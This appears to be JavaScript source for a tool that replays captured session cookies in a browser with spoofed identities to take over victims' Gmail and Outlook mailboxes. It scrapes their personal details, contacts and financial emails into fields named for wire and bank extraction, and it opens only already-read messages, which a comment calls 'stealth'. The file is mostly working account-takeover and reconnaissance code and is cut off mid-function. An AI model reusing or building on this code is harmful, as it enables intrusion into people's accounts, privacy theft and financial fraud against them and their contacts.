import logger from './logger.js';
import axios from 'axios';
import MultiProviderAI from './multiProviderAI.js';
const aiService = new MultiProviderAI();
import { launchBrowserWithSession, downloadAndExtractProfile, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
import { applyIdentityToPage } from './identity.js';
import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
import { isFreeMicrosoftDomain } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';

// ============================================================
// SMART EXTRACT ENGINE
// Re-attaches a saved browser session (cookieJSON) and extracts
// personal info, box summary, financial summary (AI), contacts
// (with pagination) and activities (AI) per account category.
// Results are persisted to the HUB sheet in a JSON column per
// category (wireExtract / bankExtract / socialExtract).
// ============================================================

const COOKIE_SHEET = 'cookie';
const HUB_SHEET = 'hub';
const HUB_FOLDER_ID = '1wohjQoXhytRKtYQJkps2H1OWUOW2WftB';

// Per-browserId in-flight guard so auto-extract and manual extract never race.
if (!globalThis.__extractInFlight) globalThis.__extractInFlight = new Set();
const getInFlight = () => globalThis.__extractInFlight;

export function isExtractInFlight(browserId) {
    return getInFlight().has(browserId);
}

const sleep = (ms) => new Promise(res => setTimeout(res, ms));

/**
 * Determine the correct Outlook base URL based on the email domain.
 * Consumer accounts (outlook.com, hotmail.com, live.com) → outlook.live.com/mail
 * Business accounts (office.com, custom domains) → outlook.office.com/mail
 */
function getOutlookBaseUrl(email) {
    const domain = email?.split('@')[1]?.toLowerCase() || '';
    return isFreeMicrosoftDomain(domain)
        ? 'https://outlook.live.com/mail'
        : 'https://outlook.office.com/mail';
}

// ==================== Session Resolution ====================

export async function resolveSession(browserId) {
    const result = await getSheetDataApi(COOKIE_SHEET);
    if (!result.success) throw new Error(`Failed to read cookie sheet: ${result.error}`);
    const headers = result.headers;
    const browserIdIdx = headers.indexOf('browserId');
    if (browserIdIdx === -1) throw new Error('cookie sheet missing browserId column');
    const row = result.data.find(r => String(r[browserIdIdx]).trim() === String(browserId).trim());
    if (!row) throw new Error(`No cookie row found for browserId: ${browserId}`);

    const col = (key) => {
        const idx = headers.indexOf(key);
        return idx !== -1 ? row[idx] : null;
    };

    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
    // Prefer the platform stored by the login flow (written at capture time from
    // MX matching — e.g. custom-domain Office accounts get 'outlook'). Domain
    // detection alone returns 'other' for custom domains, which used to make
    // extractWire fall back to gmail and navigate mail.google.com instead of the
    // account's real mailbox.
    const storedPlatform = String(col('platform') || '').toLowerCase().trim();
    const platform = (storedPlatform === 'gmail' || storedPlatform === 'outlook')
        ? storedPlatform
        : detectEmailPlatform(domain);
    const platformSource = (storedPlatform === 'gmail' || storedPlatform === 'outlook') ? 'stored' : 'domain';
    const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
    const password = col('password') || '';
    const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
    const browserIdentityRaw = col('browserIdentity') || '';
    let browserIdentity = null;
    if (browserIdentityRaw) {
        try { browserIdentity = typeof browserIdentityRaw === 'string' ? JSON.parse(browserIdentityRaw) : browserIdentityRaw; } catch (_) {}
    }

    if (!cookieJSON) throw new Error(`No cookieJSON found for browserId: ${browserId}`);

    // Best-effort platform hint for SOCIAL/BANK rows, read from the stored
    // socials/banks arrays (e.g. [{ platform: 'instagram', ... }]).
    const safeParse = (val) => {
        if (!val) return [];
        if (typeof val === 'string') { try { return JSON.parse(val); } catch { return []; } }
        return Array.isArray(val) ? val : [];
    };
    const socials = safeParse(col('socials'));
    const banks = safeParse(col('banks'));
    const socialPlatform = socials[0]?.platform || socials[0]?.website || '';
    const bankPlatform = banks[0]?.bankName || banks[0]?.website || '';

    return {
        browserId,
        email,
        domain,
        platform,
        platformSource,
        storedPlatform,
        password,
        socialPlatform,
        bankPlatform,
        cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
        driveUrl: driveUrl || '',
        category: col('category') || '',
        browserIdentity,
    };
}

export function detectEmailPlatform(domain) {
    const d = String(domain).toLowerCase();
    if (d.includes('gmail') || d.includes('googlemail')) return 'gmail';
    // Microsoft consumer + business domains. 'microsoft' covers microsoftonline.com
    // and *.onmicrosoft.com (tenant) domains; office.com/office365.com cover M365.
    if (
        d.includes('outlook') || d.includes('hotmail') || d.includes('live.com') ||
        d.includes('msn') || d.includes('microsoft') || d.includes('windowslive') ||
        d.includes('office365') || d === 'office.com' || d.endsWith('.office.com')
    ) return 'outlook';
    return 'other';
}

// Infer mailbox platform from the captured cookie domains — works for any custom
// domain whose stored platform is missing/unknown (e.g. legacy rows).
// Returns 'gmail' | 'outlook' | null.
function inferPlatformFromCookies(cookieJSON) {
    try {
        const cookies = typeof cookieJSON === 'string' ? JSON.parse(cookieJSON) : cookieJSON;
        if (!Array.isArray(cookies)) return null;
        const domains = cookies.map(c => String(c?.domain || '').toLowerCase());
        const hasGoogle = domains.some(d => d === 'google.com' || d.endsWith('.google.com') || d.includes('gmail'));
        const hasMicrosoft = domains.some(d =>
            d.includes('outlook') || d.includes('office.com') || d.includes('office365') ||
            d.includes('hotmail') || d.includes('live.com') || d.includes('microsoft.com')
        );
        if (hasMicrosoft && !hasGoogle) return 'outlook';
        if (hasGoogle && !hasMicrosoft) return 'gmail';
        return null;
    } catch (_) {
        return null;
    }
}

// ==================== Generic DOM Helpers ====================

function getCriticalSelector(url) {
    if (url.includes('mail.google.com') && (url.includes('#inbox') || url.includes('#search/')))
        return 'tr[role="row"], div[role="main"]';
    if (url.includes('contacts.google.com'))
        return 'div.XXcuqd, div[role="main"]';
    if (url.includes('myaccount.google.com'))
        return 'h1, [data-rid]';
    return null;
}

async function gotoRobust(page, url, timeout = 60000) {
    for (let attempt = 0; attempt < 2; attempt++) {
        const start = Date.now();
        try {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
            const selector = getCriticalSelector(url);
            if (selector) {
                try { await page.waitForSelector(selector, { timeout: 10000 }); }
                catch { /* loaded but selector missing */ }
            }
            logger.info(`[smartExtract] nav OK ${url} in ${Date.now() - start}ms`);
            await DOMHelpers.randomDelay(1000, 2000);
            return;
        } catch (e) {
            if (attempt === 0) {
                logger.warn(`[smartExtract] nav retry ${url} (attempt 1 failed: ${e.message})`);
                await new Promise(r => setTimeout(r, 2000));
                continue;
            }
            logger.warn(`[smartExtract] nav FAIL ${url}: ${e.message} | actual=${page.url()}`);
            throw e;
        }
    }
}

async function createTab(browser, cookieJSON) {
    const tab = await browser.newPage();
    if (browser.identity) await applyIdentityToPage(tab, browser.identity);
    const cookies = typeof cookieJSON === 'string' ? JSON.parse(cookieJSON) : cookieJSON;
    await tab.setCookie(...cookies);
    return tab;
}

// ==================== Gmail / Outlook Personal Info ====================

const SIGN_IN_PATTERNS = [
    /signin/i, /ServiceLogin/i, /challenge/i, /accounts\.google\.com\/(?:identifier|v3|signin)/i,
    /login/i, /oidc/i, /auth\/signin/i,
];

function isSignInPage(pageUrl) {
    return SIGN_IN_PATTERNS.some(p => p.test(pageUrl)) || pageUrl.includes('accounts.google.com/v3/signin');
}

const PERSONAL_INFO_SITES = {
    gmail: [
        'https://mail.google.com/mail/u/0/#inbox',
        'https://myaccount.google.com/personal-info',
        'https://myaccount.google.com/',
        'https://accounts.google.com/SignOutOptions',
    ],
    outlook: [
        'https://account.microsoft.com/profile',
        'https://account.microsoft.com/account',
    ],
};

async function extractPersonalInfo(page, platform, email = '') {
    let raw = '';

    // Gmail: try direct navigation to myaccount.google.com
    if (platform === 'gmail') {
        try {
            logger.info(`[smartExtract] personal info: navigating to myaccount.google.com/personal-info`);
            await page.goto('https://myaccount.google.com/personal-info', { waitUntil: 'networkidle2', timeout: 30000 });
            const currentUrl = page.url();
            const pageTitle = await page.title();

            // Check if we actually reached myaccount.google.com (not a sign-in page)
            if (currentUrl.includes('myaccount.google.com') && !isSignInPage(currentUrl)) {
                logger.info(`[smartExtract] personal info nav OK: url=${currentUrl}, title="${pageTitle}"`);
                await sleep(2000);
                raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
                logger.info(`[smartExtract] personal info raw length: ${raw.length} chars`);
            } else {
                // Redirected to sign-in or elsewhere — skip personal info
                logger.warn(`[smartExtract] personal info: could not reach myaccount.google.com (landed at ${currentUrl})`);
                return {
                    name: '',
                    recoveryEmail: '',
                    phone: '',
                    birthday: '',
                    gender: '',
                    altEmails: [],
                    storageUsed: '',
                    createdAt: '',
                    _diag: { url: currentUrl, title: pageTitle, error: 'redirected away from myaccount.google.com' },
                };
            }
        } catch (e) {
            logger.warn(`[smartExtract] personal info nav failed: ${e.message}`);
            return {
                name: '',
                recoveryEmail: '',
                phone: '',
                birthday: '',
                gender: '',
                altEmails: [],
                storageUsed: '',
                createdAt: '',
                _diag: { error: e.message },
            };
        }
    } else {
        // Outlook: first try extracting name from the mail header (most reliable),
        // then fall back to account.microsoft.com for additional profile data
        try {
            // Navigate to inbox to access the mail header
            const inboxUrl = `${getOutlookBaseUrl(email)}/0/inbox`;
            await page.goto(inboxUrl, { waitUntil: 'networkidle2', timeout: 30000 });
            if (!isSignInPage(page.url())) {
                await sleep(2000);
                // Try clicking the account manager button to open profile flyout
                const clicked = await page.evaluate(() => {
                    // Look for account manager / avatar button in top-right
                    const selectors = [
                        '[aria-label*="Account manager"]',
                        '[aria-label*="account manager"]',
                        '[data-testid="me-control"]',
                        'button[aria-label*="Profile"]',
                        'button[aria-label*="profile"]',
                    ];
                    for (const sel of selectors) {
                        const btn = document.querySelector(sel);
                        if (btn) { btn.click(); return true; }
                    }
                    return false;
                });
                if (clicked) {
                    await sleep(1500);
                    raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
                }
            }
        } catch (e) {
            logger.warn(`[smartExtract] Outlook mail header extraction failed: ${e.message}`);
        }

        // Fallback: try account.microsoft.com pages
        if (!raw || raw.length < 50) {
            const sites = PERSONAL_INFO_SITES.outlook;
            for (const url of sites) {
                try {
                    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
                    const currentUrl = page.url();
                    if (isSignInPage(currentUrl)) continue;
                    raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
                    if (raw.length > 50) break;
                } catch (e) {
                    logger.warn(`[smartExtract] personal info nav failed ${url}: ${e.message}`);
                }
            }
        }
    }

    const domResult = await page.evaluate((isGmail) => {
        const pick = (selectors) => {
            for (const sel of selectors) {
                try {
                    const el = document.querySelector(sel);
                    if (el && el.textContent.trim()) return el.textContent.trim();
                } catch (e) { /* invalid selector, skip */ }
            }
            return '';
        };

        let name = '';
        let email = '';
        let phone = '';
        let birthday = '';
        let gender = '';

        if (isGmail) {
            // Gmail personal-info: text-based section matching (data-rid selectors are outdated)
            name = pick([
                'h1',
                '[data-rid="10090"] .qqVS5',
                '[data-rid="10090"]',
                '[class*="name"]:not([class*="google"]):not([class*="logo"])',
            ]);
            email = pick([
                'a[href*="mailto:"]',
                '[data-rid="203"] .qqVS5',
                '[data-rid="203"]',
                '[href*="recovery"]',
                'input[type="email"]',
                '[aria-label*="email" i]',
            ]);
            phone = pick([
                'a[href*="tel:"]',
                '[data-rid="204"] .qqVS5',
                '[data-rid="204"]',
                '[href*="phone"]',
                '[aria-label*="phone" i]',
                '[class*="phone"]',
            ]);
            birthday = pick([
                '[data-rid="205"] .qqVS5',
                '[data-rid="205"]',
                '[aria-label*="birthday" i]',
                '[aria-label*="Birth" i]',
            ]);
            gender = pick([
                '[data-rid="206"] .qqVS5',
                '[data-rid="206"]',
                '[aria-label*="gender" i]',
                '[aria-label*="Gender" i]',
            ]);
        } else {
            // Microsoft profile: avoid generic h1 (matches marketing headers like "It's all here with Microsoft account")
            // Try specific Fluent UI / account.microsoft.com selectors first
            name = pick([
                '[data-testid="profile-name"]',
                '[data-testid="user-display-name"]',
                '[data-bi-id="full-name"]',
                '#profile.profile-page.personal-section.full-name',
                '[class*="Persona"] span[class*="primaryText"]',
                '[class*="persona"] span[class*="primaryText"]',
                '[class*="profile"] [class*="displayName"]',
                '[class*="profile-card"] [class*="name"]',
                '[aria-label*="Display name"]',
                // Outlook mail header account flyout selectors
                '[data-testid="me-control"] [class*="primaryText"]',
                '[class*="account-manager"] [class*="name"]',
            ]);
            email = pick([
                '[data-bi-id="email-address"]',
                '[data-testid="email-address"]',
                'input[type="email"]',
                '[aria-label*="email" i]',
                'a[href^="mailto:"]',
            ]);
            phone = pick([
                '[data-bi-id="phone-number"]',
                '[data-testid="phone-number"]',
                '[aria-label*="phone" i]',
                'a[href^="tel:"]',
            ]);
            birthday = pick([
                '[data-bi-id="birth-date"]',
                '[data-testid="birth-date"]',
                '[aria-label*="birthday" i]',
                '[aria-label*="birth" i]',
            ]);
            gender = pick([
                '[data-bi-id="gender"]',
                '[data-testid="gender"]',
                '[aria-label*="gender" i]',
            ]);
        }

        return {
            name,
            recoveryEmail: email,
            phone,
            birthday,
            gender,
            raw: document.body.textContent.trim().slice(0, 6000),
            _diag: {
                url: location.href,
                title: document.title,
                h1Count: document.querySelectorAll('h1').length,
                mailtoCount: document.querySelectorAll('a[href*="mailto:"]').length,
                telCount: document.querySelectorAll('a[href*="tel:"]').length,
                dataEmailCount: document.querySelectorAll('[data-email]').length,
                ariaLabelEmailCount: document.querySelectorAll('[aria-label*="email" i]').length,
                rawLen: document.body.textContent.length,
            },
        };
    }, platform === 'gmail');

    let aiResult = null;
    try {
        aiResult = await aiService.inferAccountMetadata(raw || domResult.raw || '');
    } catch (e) {
        logger.warn(`[smartExtract] personalInfo AI failed: ${e.message}`);
    }

    logger.info(`[smartExtract] personal diag: url="${domResult._diag?.url}", title="${domResult._diag?.title}", h1=${domResult._diag?.h1Count}, mailto=${domResult._diag?.mailtoCount}, tel=${domResult._diag?.telCount}, dataEmail=${domResult._diag?.dataEmailCount}, rawLen=${domResult._diag?.rawLen}`);

    return {
        name: domResult.name || aiResult?.name || '',
        recoveryEmail: domResult.recoveryEmail || aiResult?.recoveryEmail || '',
        phone: domResult.phone || aiResult?.phone || '',
        birthday: domResult.birthday || '',
        gender: domResult.gender || '',
        altEmails: aiResult?.altEmails || [],
        storageUsed: aiResult?.storageUsed || '',
        createdAt: aiResult?.createdAt || '',
        _diag: domResult._diag || {},
    };
}

// ==================== Box Summary ====================

async function extractBoxSummary(page, platform, email) {
    const inboxUrl = platform === 'gmail'
        ? 'https://mail.google.com/mail/u/0/#inbox'
        : `${getOutlookBaseUrl(email)}/0/inbox`;
    try {
        await gotoRobust(page, inboxUrl);
        if (isSignInPage(page.url())) {
            logger.warn(`[smartExtract] box summary redirected to sign-in: ${page.url()}`);
            return { totalEmails: 0, unreadEmails: 0, folders: [], labels: [], _diag: { error: 'sign-in redirect' } };
        }
        // Wait for SPA to fully load — wait for email rows to appear
        try {
            const boxWaitSel = platform === 'gmail' ? 'tr[role="row"], .zA, .zE' : 'div[data-index]';
            await page.waitForSelector(boxWaitSel, { timeout: 10000 });
            logger.info(`[smartExtract] box: email rows appeared`);
        } catch (e) {
            logger.warn(`[smartExtract] box: no email rows after 10s, proceeding anyway`);
        }
    } catch (e) {
        logger.warn(`[smartExtract] box summary nav failed: ${e.message}`);
        return { totalEmails: 0, unreadEmails: 0, folders: [], labels: [], _diag: { error: e.message } };
    }

    const result = await page.evaluate(() => {
        const folders = [];
        const labels = [];
        let unreadEmails = 0;
        let totalEmails = 0;
        const diag = { title: document.title, url: location.href };

        if (window.location.hostname.includes('google')) {
            // Gmail: extract unread count from document.title ("Inbox (5) - Gmail")
            const titleMatch = document.title.match(/\((\d+)\)/);
            unreadEmails = titleMatch ? parseInt(titleMatch[1]) || 0 : 0;

            // Count visible email rows for total
            const rows = document.querySelectorAll('tr[role="row"]');
            totalEmails = rows.length;
            diag.trRoleRow = rows.length;
            diag.zA = document.querySelectorAll('.zA').length;
            diag.zE = document.querySelectorAll('.zE').length;
            diag.roleRowAll = document.querySelectorAll('[role="row"]').length;

            // Folders from sidebar links
            document.querySelectorAll('a[href*="#inbox"], a[href*="#sent"], a[href*="#drafts"], a[href*="#starred"], a[href*="#snoozed"], a[href*="#trash"], a[href*="#spam"]').forEach(el => {
                const t = (el.textContent || '').trim();
                if (t && t.length < 40) folders.push(t);
            });

            // Also try navigation links
            document.querySelectorAll('div[role="navigation"] [role="link"]').forEach(el => {
                const t = (el.textContent || '').trim();
                if (t && t.length < 40 && !folders.includes(t)) folders.push(t);
            });
        } else {
            // Outlook: extract from DOM
            // Count total visible messages via data-index rows
            const allRows = document.querySelectorAll('div[data-index]');
            totalEmails = allRows.length;

            // Folders/labels from sidebar tree
            document.querySelectorAll('[class*="folder"], [class*="Folder"], [role="treeitem"]').forEach(el => {
                const t = (el.textContent || '').trim();
                if (t && t.length < 40) labels.push(t);
            });

            // Unread count from folder pane or page text
            // Try folder pane first — look for "Inbox NNN new" pattern in tree items
            document.querySelectorAll('[role="treeitem"]').forEach(el => {
                if (unreadEmails > 0) return; // already found
                const text = (el.textContent || '').trim();
                const label = el.getAttribute('aria-label') || '';
                const combined = text + ' ' + label;
                if (/inbox/i.test(combined)) {
                    const m = combined.match(/(\d[\d,]*)\s*(new|unread)/i);
                    if (m) unreadEmails = parseInt(m[1].replace(/,/g, '')) || 0;
                }
            });

            // Fallback: body text regex
            if (unreadEmails === 0) {
                const bodyText = document.body.textContent || '';
                const unreadMatch = bodyText.match(/(\d[\d,]*)\s*(new|unread)/i);
                unreadEmails = unreadMatch ? parseInt(unreadMatch[1].replace(/,/g, '')) || 0 : 0;
            }
        }

        return {
            totalEmails,
            unreadEmails,
            folders: folders.slice(0, 30),
            labels: labels.slice(0, 30),
            _diag: diag,
        };
    });

    logger.info(`[smartExtract] box diag: title="${result._diag.title}", trRoleRow=${result._diag.trRoleRow || 0}, zA=${result._diag.zA || 0}, folders=${result.folders.length}`);
    return result;
}

// ==================== Contacts (pagination) ====================

async function extractContacts(page, platform, email, maxContacts = 200) {
    const contacts = [];
    const seen = new Set();

    if (platform === 'outlook') {
        // Outlook: extract contacts from inbox messages (read only, stealth)
        return await extractContactsFromOutlookInbox(page, email, maxContacts);
    }

    // Gmail: extract from 3 contacts pages (main, frequent, other)
    const contactPages = [
        'https://contacts.google.com',
        'https://contacts.google.com/frequent',
        'https://contacts.google.com/other',
    ];

    for (const url of contactPages) {
        if (contacts.length >= maxContacts) break;

        try {
            await gotoRobust(page, url);
            if (isSignInPage(page.url())) {
                logger.warn(`[smartExtract] contacts redirected to sign-in: ${page.url()}`);
                continue;
            }

            // Wait for contact list to render — look for XXcuqd rows
            let hasContactList = false;
            try {
                await page.waitForSelector('div.XXcuqd[role="presentation"]', { timeout: 15000 });
                hasContactList = true;
                logger.info(`[smartExtract] contacts ${url}: contact list appeared`);
            } catch (e) {
                logger.warn(`[smartExtract] contacts ${url}: no contact list after 15s, skipping`);
                continue;
            }

            const pageTitle = await page.title();
            const pageUrl = page.url();
            let pageDiag = {};

            for (let i = 0; i < 8; i++) {
                const batch = await page.evaluate(() => {
                    const out = [];
                    // Diagnostic counts
                    const diag = {
                        XXcuqd: document.querySelectorAll('div.XXcuqd[role="presentation"]').length,
                        AYDrSb: document.querySelectorAll('div.AYDrSb').length,
                        dataEmail: document.querySelectorAll('[data-email]').length,
                        phoneCol: document.querySelectorAll('[aria-describedby*="phone-column"]').length,
                        taglineCol: document.querySelectorAll('[aria-describedby*="generated-tagline-column"]').length,
                        roleRow: document.querySelectorAll('[role="row"]').length,
                        allDivs: document.querySelectorAll('div').length,
                        title: document.title,
                        url: location.href,
                    };

                    // Gmail contacts: div.XXcuqd[role="presentation"] rows with div.JcPRM cells
                    const rows = document.querySelectorAll('div.XXcuqd[role="presentation"]');
                    let firstRowDiag = null;
                    rows.forEach((row, idx) => {
                        // Name: div.AYDrSb with id attribute
                        const nameEl = row.querySelector('div.AYDrSb');
                        const name = nameEl?.textContent?.trim() || '';

                        // Email: [data-email] attribute on chips
                        const emailEl = row.querySelector('[data-email]');
                        const email = emailEl?.getAttribute('data-email') || '';

                        // Phone: [aria-describedby*="phone-column"]
                        const phoneEl = row.querySelector('[aria-describedby*="phone-column"]');
                        const phone = phoneEl?.textContent?.trim() || '';

                        // Job/Company: [aria-describedby*="generated-tagline-column"]
                        const jobEl = row.querySelector('[aria-describedby*="generated-tagline-column"]');
                        const company = jobEl?.textContent?.trim() || '';

                        if (idx === 0) {
                            firstRowDiag = {
                                name: name || 'EMPTY',
                                email: email || 'EMPTY',
                                nameFound: !!nameEl,
                                emailFound: !!emailEl,
                                rowHTML: row.innerHTML.substring(0, 300),
                            };
                        }

                        if (name || email) {
                            out.push({ name, email, phone, company });
                        }
                    });
                    diag.firstRow = firstRowDiag;
                    return { out, diag };
                });

                if (i === 0) {
                    pageDiag = batch.diag;
                    logger.info(`[smartExtract] contacts ${url}: XXcuqd=${batch.diag.XXcuqd}, AYDrSb=${batch.diag.AYDrSb}, dataEmail=${batch.diag.dataEmail}, phoneCol=${batch.diag.phoneCol}, batchOut=${batch.out.length}, allDivs=${batch.diag.allDivs}, title="${batch.diag.title}"`);
                    if (batch.diag.firstRow) {
                        logger.info(`[smartExtract] contacts ${url} firstRow: name="${batch.diag.firstRow.name}", email="${batch.diag.firstRow.email}", nameFound=${batch.diag.firstRow.nameFound}, emailFound=${batch.diag.firstRow.emailFound}, html="${batch.diag.firstRow.rowHTML}"`);
                    }
                }

                let added = 0, skippedDedup = 0;
                for (const c of batch.out) {
                    const key = (c.email || c.name || '').toLowerCase();
                    if (!key || seen.has(key)) { skippedDedup++; continue; }
                    seen.add(key);
                    added++;
                    contacts.push({
                        name: c.name || '',
                        email: c.email || '',
                        lastInteractionDate: '',
                        relationshipSummary: '',
                        interactionCount: 0,
                        otherData: {
                            phoneNumbers: c.phone ? [c.phone] : [],
                            company: c.company || '',
                            notes: '',
                        },
                    });
                }
                logger.info(`[smartExtract] contacts ${url} i=${i}: batchOut=${batch.out.length}, added=${added}, skippedDedup=${skippedDedup}, totalSoFar=${contacts.length}`);

                if (contacts.length >= maxContacts) break;

                const prevCount = contacts.length;
                await page.evaluate(() => window.scrollBy(0, 1500));
                await sleep(1800);
                const nextBtn = await page.$('button[aria-label*="next"], [class*="next"] button, [role="button"][aria-label*="Next"]');
                if (nextBtn) {
                    try { await nextBtn.click(); } catch (e) { /* noop */ }
                    await sleep(1800);
                }
                if (contacts.length === prevCount && !nextBtn) break;
            }
        } catch (e) {
            logger.warn(`[smartExtract] contacts extraction failed for ${url}: ${e.message}`);
        }
    }

    return contacts.slice(0, maxContacts);
}

/**
 * Outlook contacts: extract from inbox messages. Only READ messages (no DLvHz class).
 * Clicks into each message to parse sender/recipient from the inner template.
 */
async function extractContactsFromOutlookInbox(page, email, maxContacts = 200) {
    const contacts = [];
    const seen = new Set();

    try {
        await gotoRobust(page, `${getOutlookBaseUrl(email)}/0/inbox`);
        // Wait for inbox rows to render — Outlook uses virtual scrolling
        // so the DOM needs time to populate after navigation.
        try {
            await page.waitForSelector('div[data-index]', { timeout: 15000 });
        } catch (_) {
            // fallback: extra wait if rows never appeared
            await sleep(5000);
        }

        // Scroll down to load more messages (Outlook uses virtual scrolling)
        const readMessageIndexes = [];
        const seenIndexes = new Set();

        for (let scrollIteration = 0; scrollIteration < 8; scrollIteration++) {
            // Find READ messages in current DOM viewport
            const newIndexes = await page.evaluate((existingIndexes) => {
                const rows = document.querySelectorAll('div[data-index]');
                const readIndexes = [];
                rows.forEach(row => {
                    const isUnread = row.querySelector('.DLvHz') || row.classList.contains('DLvHz');
                    if (!isUnread) {
                        const idx = row.getAttribute('data-index');
                        if (idx !== null && !existingIndexes.includes(idx)) {
                            readIndexes.push(idx);
                        }
                    }
                });
                return readIndexes;
            }, readMessageIndexes);

            for (const idx of newIndexes) {
                if (!seenIndexes.has(idx)) {
                    seenIndexes.add(idx);
                    readMessageIndexes.push(idx);
                }
            }

            logger.info(`[smartExtract] Outlook inbox scroll ${scrollIteration + 1}/8: found ${readMessageIndexes.length} READ messages total`);

            // Stop scrolling if we have enough messages
            if (readMessageIndexes.length >= maxContacts) break;

            // Scroll down to trigger virtual scroll loading
            // Outlook uses an inner scrollable container, not window.
            const prevCount = readMessageIndexes.length;
            await page.evaluate(() => {
                const scroller = document.querySelector('[role="main"] div[style*="overflow"]')
                    || document.querySelector('div[class*="scroll"]')
                    || document.querySelector('[class*="SQLrst"]') // Outlook mail list container class
                    || document.querySelector('div[role="main"]');
                if (scroller && scroller !== document.documentElement) {
                    scroller.scrollBy(0, 1500);
                } else {
                    window.scrollBy(0, 1500);
                }
            });
            await sleep(1800);

            // If no new messages loaded, we've reached the end
            if (readMessageIndexes.length === prevCount) break;
        }

        logger.info(`[smartExtract] Found ${readMessageIndexes.length} READ messages in Outlook inbox after scrolling`);

        const maxToProcess = Math.min(readMessageIndexes.length, Math.ceil(maxContacts / 2));
        for (let i = 0; i < maxToProcess; i++) {
            if (contacts.length >= maxContacts) break;

            try {
                // Re-navigate to inbox each time (DOM may have changed)
                if (i > 0) {
                    await gotoRobust(page, `${getOutlookBaseUrl(email)}/0/inbox`);
                    await sleep(2000);
                    // Scroll back to the message we need
                    await page.evaluate((idx) => {
                        const row = document.querySelector(`div[data-index="${idx}"]`);
                        if (row) row.scrollIntoView();
                    }, readMessageIndexes[i]);
                    await sleep(500);
                }

                // Click the READ message
                const clicked = await page.evaluate((idx) => {
                    const rows = document.querySelectorAll('div[data-index]');
                    for (const row of rows) {
                        if (row.getAttribute('data-index') === idx) {
                            row.click();
                            return true;
                        }
                    }
                    return false;
                }, readMessageIndexes[i]);

                if (!clicked) continue;
                await sleep(2500);

                // Extract from inner message template
                const messageData = await page.evaluate(() => {
                    const getText = (sel) => document.querySelector(sel)?.textContent?.trim() || '';
                    return {
                        sender: getText('span[aria-label^="From:"]'),
                        recipient: getText('span[aria-label^="To:"]'),
                        subject: getText('[aria-label="Subject"]') || getText('span[title]') || '',
                        snippet: getText('[aria-label="Message preview"]') || getText('span[aria-label*="preview"]') || '',
                        date: getText('[aria-label="Received"]') || getText('span[aria-label*="Received"]') || '',
                        body: getText('div[aria-label="Message body"]'),
                    };
                });

                // Parse sender email from "Name <email>" format
                const parseEmail = (text) => {
                    const match = text.match(/<([^>]+)>/) || text.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
                    return match ? match[1] : '';
                };
                const parseName = (text) => {
                    const match = text.match(/^"?([^"<]+)"?\s*</);
                    return match ? match[1].trim() : text.split('<')[0].trim();
                };

                // Add sender as contact
                const senderEmail = parseEmail(messageData.sender);
                const senderName = parseName(messageData.sender);
                if (senderEmail && !seen.has(senderEmail.toLowerCase())) {
                    seen.add(senderEmail.toLowerCase());
                    contacts.push({
                        name: senderName,
                        email: senderEmail,
                        lastInteractionDate: messageData.date || '',
                        relationshipSummary: '',
                        interactionCount: 1,
                        otherData: { phoneNumbers: [], company: '', notes: '' },
                    });
                }

                // Add recipient as contact
                const recipientEmail = parseEmail(messageData.recipient);
                const recipientName = parseName(messageData.recipient);
                if (recipientEmail && !seen.has(recipientEmail.toLowerCase())) {
                    seen.add(recipientEmail.toLowerCase());
                    contacts.push({
                        name: recipientName,
                        email: recipientEmail,
                        lastInteractionDate: messageData.date || '',
                        relationshipSummary: '',
                        interactionCount: 1,
                        otherData: { phoneNumbers: [], company: '', notes: '' },
                    });
                }
            } catch (e) {
                logger.warn(`[smartExtract] outlook message ${i} failed: ${e.message}`);
            }
        }
    } catch (e) {
        logger.warn(`[smartExtract] outlook contacts extraction failed: ${e.message}`);
    }

    return contacts.slice(0, maxContacts);
}

// ==================== Financial Summary (fast search + AI) ====================

const FINANCIAL_TERMS = ['invoice', 'payment', 'receipt', 'bank', 'transfer', 'paypal', 'zelle', 'venmo', 'transaction'];

function financialSearchUrl(platform, term) {
    if (platform === 'gmail') {
        return `https://mail.google.com/mail/u/0/#search/${encodeURIComponent(term)}`;
    }
    // Note: Outlook search is handled via UI-based search in performOutlookSearch(), not URL-based
    return `https://outlook.live.com/mail/0/search?query=${encodeURIComponent(term)}`;
}

/**
 * UI-based search for Outlook. Uses the search box (#topSearchInput) instead of URL navigation.
 * This avoids session redirects that occur with direct search URL navigation.
 * Between terms, clears the search box with Ctrl+A and types the next term.
 */
async function performOutlookSearch(page, terms, email, maxEmails = 30) {
    const emails = [];
    const seen = new Set();
    const searchSelector = '#topSearchInput';
    const base = getOutlookBaseUrl(email);

    // Navigate to inbox first to ensure the search box is available
    try {
        await gotoRobust(page, `${base}/0/inbox`);
    } catch (e) {
        logger.warn(`[smartExtract] Outlook: inbox navigation failed: ${e.message}`);
        // Try the other domain as fallback
        const fallback = base === 'https://outlook.live.com/mail'
            ? 'https://outlook.office.com/mail'
            : 'https://outlook.live.com/mail';
        try {
            await gotoRobust(page, `${fallback}/0/inbox`);
        } catch (e2) {
            logger.warn(`[smartExtract] Outlook: fallback inbox also failed: ${e2.message}`);
            return emails;
        }
    }

    if (isSignInPage(page.url())) {
        logger.warn(`[smartExtract] Outlook: inbox redirected to sign-in: ${page.url()}`);
        return emails;
    }

    // Wait for search box to appear
    try {
        await page.waitForSelector(searchSelector, { visible: true, timeout: 15000 });
    } catch (e) {
        logger.warn(`[smartExtract] Outlook search box not found, skipping`);
        return emails;
    }

    for (const term of terms) {
        if (emails.length >= maxEmails) break;
        try {
            // Click search box, select all existing text, type new term
            await page.click(searchSelector);
            await page.keyboard.down('Control');
            await page.keyboard.press('a');
            await page.keyboard.up('Control');
            await page.type(searchSelector, term, { delay: 50 });
            await page.keyboard.press('Enter');

